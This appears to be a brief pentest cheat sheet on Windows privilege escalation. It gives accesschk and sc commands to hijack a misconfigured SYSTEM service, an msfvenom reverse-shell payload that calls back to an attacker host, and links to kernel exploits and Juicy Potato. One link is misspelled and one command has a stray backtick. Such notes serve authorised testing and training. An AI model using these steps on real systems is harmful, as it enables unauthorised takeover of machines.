# Windows privilege escalation

## Services

### Insecure Permissions
If you are able to modify a service that runs as system and start/stop the service, you may be able to escalate privileges by modifying the binpath of the service.
You have the required permission if `accesschk.exe /accepteula -uecqv user <service-name>` returns
`SERVICE_CHANGE_CONFIG`, `SERVICE_START` and `SERVICE_STOP`. Be sure to use the old accesschk as the new version doesn't allow accept the EULA using a command line option.

You can check if a service runs as system by running `sc qc <service-name` and checking the `SERVICE_START_NAME`.
Create a reverse shell using `msfvenom -p windows/x64/shell_reverse_tcp LHOST=<your-ip> LPORT=<target-port>` -f exe -o reverse.exe`.
Then modify the binpath with `sc config <service-name> binpath="\"C:\Path\to\reverse.exe\""`.
Open a netcat listener on kali and then stop/start the service on the windows target.

## Kernel Exploits
Exploit suggester: `https://github.com/bitsadmin/wesng`  
Precompiled exploits: `https://githb.com/SecWiki/windows-kernel-exploits`

## Juicy potato
If `whoami /priv` indicates the current user has the `SeImpersonate` or `SeAssignPrimaryToken` privileges, then you can use
[juicy potato](https://github.com/ohpe/juicy-potato) to obtain a root shell.
